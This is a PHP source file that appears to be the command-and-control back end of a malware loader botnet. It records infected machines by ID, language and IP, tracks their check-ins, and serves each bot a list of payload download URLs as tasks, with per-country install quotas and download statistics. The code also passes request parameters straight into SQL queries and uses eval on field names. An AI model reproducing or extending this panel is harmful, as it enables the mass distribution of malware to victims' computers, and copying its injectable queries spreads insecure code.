<?php

//rap script
//only after 1.0.8-loader version. compatible

error_reporting(0);

set_magic_quotes_runtime(1);

if(!isset($UNKER_ROOT))
  $UNKER_ROOT = '';
  
require_once($UNKER_ROOT.'mycommon.php');



$mres = @mysql_connect($BOT_DBHOST,$BOT_DBLOGIN,$BOT_DBPASS) or die("Could not connect to DB.<br> MySQL Message:".mysql_error());

if(!mysql_select_db($BOT_DBNAME))
  die('Could not select DB <br> Mysql message:'.mysql_error());


  
  //security block.
 if(!isset($_GET['d']))
  exit;
 $id=$_GET['d'];
if ($id=="")
    exit();    
if(strlen($id)<19)
 exit;

 
  
if(isset($_GET['l']))
$lg = strtoupper(substr($_GET['l'],0,2));
 else
$lg= 'UNK';
 
 
 
 
 

$q = 'SELECT * FROM `'.$BOT_DBTBL.'` WHERE `FCompID`="'.$id.'" limit 1;'; 
$result = mysql_query($q,$mres);

if(mysql_num_rows($result)){

	
bot_raport($id,$mres);	

  if(is_on_single($mres,$id)){
  	 
  	 
  	 $ep = get_urls($id,$mres,'task_single','TCompId');

  }else{   
            
	$ep = get_urls(@$_GET['l'],$mres,'task','Tland');
	
	  if(is_bot_fexecuted($id,$mres)) 
    $ep = '1';
  };

	
 	 echo $ep."\r\n";
 	 
  //exit('asd'.is_bot_fexecuted($id,$mres));
}else{
echo add_new_bot($mres);
};

  
  
   

 if(isset($_GET['k'])){
 	
 	add_2_fexecuted($id,$mres);
 	
  //action to add in stats
  if(is_on_single($mres,$id))
  @down_file($_GET['k'],$_SERVER["REMOTE_ADDR"],$mres,$id);	
  else	
  @down_file($_GET['k'],$_GET['l'],$mres,$id);	

 // if(!isset($_GET['surv'])) Old version.
  // del_bot_by_id($id,$mres);	 
 };


 
 
 
 
 
 
require('r_zu.php'); 
require('r_antisoft.php');  
 
 
 

//Functions+++++++++++++++++++++++++++++++++


function add_record($mres,$tbl){
global $tm;	    
    
    $q = "UPDATE ".$tbl." SET `h_".$tm['lhour']."`=`h_".$tm['lhour']."`+1 WHERE `date`='".$tm['lrep']."';";
    mysql_query($q,$mres);
    
    if(!mysql_affected_rows($mres)){
    	
    	$q = "INSERT INTO ".$tbl."(`date`,`year`,`month`,`day`) values('".$tm['lrep']."','".$tm['lrep']."','".$tm['lmonth']."','".$tm['lday']."');";
    	mysql_query($q,$mres);
    	
         if(mysql_affected_rows($mres))	
           add_record($mres,$tbl);	
    };
    	return 0;
};





function down_file($k,$land,$mres,$id){

if(!is_on_single($mres,$id))
 if(is_set_all($mres))
  $land = "All";	
	
	$f_heap_arr = explode(',',$k);
	
	$fname = array();
	$fsize = array();
	
	print_r($f_heap_arr);
	for($i=0;$i<count($f_heap_arr);$i++){
				
		$fname[] = substr($f_heap_arr[$i],strpos($f_heap_arr[$i],"_")+1);
		$fsize[] = substr($f_heap_arr[$i],0,strpos($f_heap_arr[$i],"_"));		
		
		
		//add files to time statistics
     add_record($mres,'`stat_down`');		
		
	};
	
 
 for($i=0;$i<count($f_heap_arr);$i++){	
 
	$q = "SELECT * FROM `downfiles` WHERE `Dland`='".strtoupper($land)."' and `Dfname`='".$fname[$i]."' and `Dsize`='".$fsize[$i]."';";
	$result = mysql_query($q);
	//echo $q."<br>";
	if(mysql_num_rows($result)){
	  $row = mysql_fetch_object($result);		 	
		$q = "UPDATE `downfiles` SET `Dcnt` = `Dcnt` + 1 WHERE `Did`=".$row->Did.";";		
		mysql_query($q,$mres);
				
	}else{
		
	 $q ="INSERT INTO `downfiles`(`Dland`,`Dfname`,`Dsize`,`Dcnt`,`Dtime`) values('".strtoupper($land)."','".$fname[$i]."',".$fsize[$i].",1,".time(0).");"; 	
	 mysql_query($q,$mres);
	// echo $q."<br>";	
	};
	
 };  	
	echo  $q;
 
 return mysql_affected_rows($mres);
 
};





  
function get_urls($land,$mres,$tbl,$land_or_id){

if($tbl=='task')	
 if(is_set_all($mres))
  $land = "All";	
	
  
	$q = "SELECT * FROM `".$tbl."` WHERE `".$land_or_id."`='".strtoupper($land)."' limit 1;";
	
	$result = mysql_query($q,$mres);
	//echo mysql_num_rows($result);
	
	$row = mysql_fetch_object($result);
	//echo $q;
	
	$ret = '';
	
   if($row->Tinstall=='0'){
	  $ret = $row->Turls ;
   }elseif(!(get_installed($land,$mres) >= $row->Tinstall)) 
	 $ret = $row->Turls ;
	 
 //echo $row->Turls;
//	if(get_installed($land,$mres) >= $row->Tinstall)
	//  echo 'sdasd'.get_installed($land,$mres).'  '.$row->Tinstall.'  '.$land; 
	 
	$ret = trim($ret); 
	 if(strlen($ret)<1)
	  $ret = '1';
	 
	 $ret ="\r\n#U1:".str_replace("\n","\r\n#U1:",$ret); 
	  
	 
   return $ret;	 
};



function del_bot_by_id($id,$mres){
global $BOT_DBTBL;

$q ="DELETE FROM `".$BOT_DBTBL."` WHERE `FCompID`='".$id."' limit 1;";	
	mysql_query($q,$mres);

return mysql_affected_rows($mres);	
	
};





function add_new_bot($mres){
global $BOT_DBTBL,$_GET,$_SERVER;	

$ip=$_SERVER["REMOTE_ADDR"];

 if(!@isset($_GET['v']))
 $ver = 'def.';
 else 
$ver=@$_GET['v'];


if(isset($_GET['l']))
$lg = strtoupper(substr($_GET['l'],0,2));
 else
$lg= 'UNK';

 $id=$_GET['d'];
$lday=date('d');
$ltme=date('H:i:s');
$lmonth=date('m');
$lyear=date('y');
$lrep='['.$lday.'/'.$lmonth.'/'.$lyear.'] '.$ltme;
$lrepint=time(0);

 $q = "insert into `$BOT_DBTBL` (FLang,FCompID,FFirstRep,FFirstRepInt,FLastRepInt,FTime,FDay,FMonth,FYear,FQuery,FExecuted,ip_addr,FVer) values ('$lg','$id','$lrep','$lrepint','$lrepint','$ltme','$lday','$lmonth','$lyear','','','$ip','$ver')";

 
 
 mysql_query($q,$mres);
 
 
    $land = @$_GET['l'];
	
	 if(is_set_all($mres))
      $land = "All";
  
      
      
  
      

	 
  $ret = get_urls($lg,$mres,'task','Tland');//give urls after first raport

  if(is_bot_fexecuted($id,$mres))
   $ret = '1';
  
 return $ret;
 
};




function is_on_single($mres,$compid){
$q  = 'SELECT * FROM `task_single` WHERE `TCompId`="'.$compid.'"';
 return mysql_num_rows(mysql_query($q,$mres));	
};




function bot_raport($id,$mres){
global $BOT_DBTBL,$_GET,$_SERVER;	

$ip=$_SERVER["REMOTE_ADDR"];

 if(!@isset($_GET['v']))
 $ver = 'def.';
 else 
$ver=@$_GET['v'];


if(isset($_GET['l']))
$lg = strtoupper(substr($_GET['l'],0,2));
 else
$lg= 'UNK';

 $id=$_GET['d'];
$lday=date('d');
$ltme=date('H:i:s');
$lmonth=date('m');
$lyear=date('y');
$lrep='['.$lday.'/'.$lmonth.'/'.$lyear.'] '.$ltme;
$lrepint=time(0);



							  //FQuery='', 
  $q = "update $BOT_DBTBL set  FLastRep='$lrep',FLastRepInt='$lrepint', FRepCnt= FRepCnt+1, FTime='$ltme', FDay='$lday', FMonth='$lmonth', FYear='$lyear', ip_addr='$ip', FVer='$ver' where FCompID='$id'";	
  
  
 mysql_query($q,$mres);
 
 //add bot raport to statistics
 add_record($mres,'`stat_bot_rap`');
 
 return mysql_affected_rows($mres);
  
	
};








function get_installed($land,$mres){

if(strlen($land)>5){
	$land = get_bot_ip($land,$mres);
};
	
	
	$q = "SELECT sum(`Dcnt`) as `Dcnt` FROM `downfiles` WHERE `Dland`='".strtoupper($land)."';";
  $result = @mysql_query($q,$mres);
	if(!mysql_num_rows($result))
	 return 0;
	 
	$row = mysql_fetch_object($result);

	return $row->Dcnt;
	  	 
};



function get_bot_ip($id,$mres){
	
$q = 'SELECT * FROM `bots` WHERE `FCompId`="'.$id.'" Limit 1';	
 $row = mysql_fetch_object(mysql_query($q,$mres));
 return $row->ip_addr;
};




function is_set_all($mres){
	
	$q = 'SELECT * FROM `task` WHERE `Tland` = "All"';	
  $result =	mysql_query($q,$mres);
	
 return mysql_num_rows($result);	
	
};


function is_bot_fexecuted($id,$mres){

	
     $t_id = get_task_id($id,$mres);    
     
   $q = "SELECT * FROM `bots` WHERE FCompID='".$id."'";
    
   $result = mysql_query($q,$mres);
   
  $row = mysql_fetch_object($result);

  //echo $t_id.'<br>'.$row->FExecuted;exit;
  
  if($t_id == trim($row->FExecuted))  // for that bot task already done.
    return 1;
    
    return 0;
	
};



function add_2_fexecuted($id,$mres){
 global $_GET;

     @$land = $_GET['l'];
	
	 if(is_set_all($mres))
      $land = "All";
  
           $t_id = get_task_id($id,$mres);   
      
 // if(is_bot_fexecuted($id,$mres))  // for that bot task already done.
  //  return 0;
    
   
   $q = "UPDATE `bots` SET `FExecuted`='".$t_id."'  WHERE `FCompID`='".$id."'  limit 1;";
    mysql_query($q,$mres);
   
      
    return mysql_affected_rows($mres);
		
};





function get_task_id($id,$mres){
	
global $_GET;

     $land = @$_GET['l'];
	
	 if(is_set_all($mres))
      $land = "All";
           
  $q = "SELECT * FROM `task` WHERE `Tland`='".$land."'";

 $result = mysql_query($q,$mres); 
  if(!mysql_num_rows($result))
   return 0;
      $row = mysql_fetch_object($result);

//  if($row->Tkill == '1')    -- tkill here
 //     return 1;
     return $row->Tid; 			
};





function get_bot_inf($FCompID=0,$field){
	global $mres,$id;

	if(!$FCompID)
	$FCompID = $id;
	
	$q = "SELECT `".$field."` FROM `bots` WHERE `FCompID`='".$FCompID."'";

	$result = @mysql_query($q,$mres);
	if(!@mysql_num_rows($result))
	return '';

	$row = mysql_fetch_object($result);
	$ret = '';

	eval("\$ret = \$row->".$field.";");
	return $ret;
};




function wri_bot_inf($FCompID=0,$field,$inf){
global $mres,$id;	

if(!$FCompID)
 $FCompID=$id;

$q = "UPDATE `bots` SET `".$field."`=".(gettype($inf)=="string" ? "'" : '').$inf.(gettype($inf)=="string" ? "'" : '')." WHERE `FCompID`='".$FCompID."' LIMIT 1 ";
 @mysql_query($q,$mres);

return @mysql_affected_rows($mres);
 
};






function compare_crc_executed($tmplcrc){
global $id;
	$botcrc = trim(get_bot_inf($id,'FExecutedCrc'));
	
	 $tmplcrc = trim($tmplcrc);
	 
	if($tmplcrc==$botcrc)
	 return true;
	
	return false;
	
};




?>

